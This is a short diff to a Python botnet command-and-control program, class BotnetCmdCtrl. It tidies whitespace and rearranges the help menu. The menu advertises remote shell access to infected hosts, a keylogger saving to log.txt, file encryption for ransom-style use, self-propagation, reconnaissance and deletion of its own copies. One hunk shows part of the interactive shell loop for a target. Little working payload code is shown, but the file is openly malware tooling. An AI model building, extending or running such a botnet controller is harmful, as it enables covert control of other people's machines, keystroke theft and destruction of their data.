@@ -396,7 +396,7 @@ class BotnetCmdCtrl:
 			conn = LINUX_CONNS[target_ip]
 		except KeyError:
 			print(RED + '[-] Invalid index!' + RED)
-			
+
 		while True:
 			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
 			if cmd == 'back':
@@ -534,15 +534,15 @@ class BotnetCmdCtrl:
 		print(ORANGE + BOLD + '  check mode >', RESET, 'Check write mode.')
 		print(ORANGE + BOLD + '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
 		print(ORANGE + BOLD + '  autorecon windows >', RESET, 'Performs basic reconnaissance on Windows machines.')
-		print(ORANGE + BOLD + '  propagate >', RESET, "Copy client file to three different directory.")
-		print(ORANGE + BOLD + '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
 		print(ORANGE + BOLD + '  sh [command] >', RESET, 'Execute command on the host machine.')
 		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
 		print(ORANGE + BOLD + '  close >', RESET , 'Will close all active connections.')
 		print(ORANGE + BOLD + '  exit >', RESET, "Quit the program.", end='\n\n')
 		print(PURPLE + BOLD + 'Commands when connected to a target:', RESET)
-		print(ORANGE + BOLD + '  keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
+		print(ORANGE + BOLD + '  keylog >', RESET, 'Begins a keylogger, store data in tmp folder, file name log.txt.')
 		print(ORANGE + BOLD + '  encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
+		print(ORANGE + BOLD + '  propagate >', RESET, "Copy client file to three different directory.")
+		print(ORANGE + BOLD + '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
 		print(ORANGE + BOLD + '  decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
 		print(ORANGE + BOLD + '  back >', RESET, 'Return to the main session.')
 		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
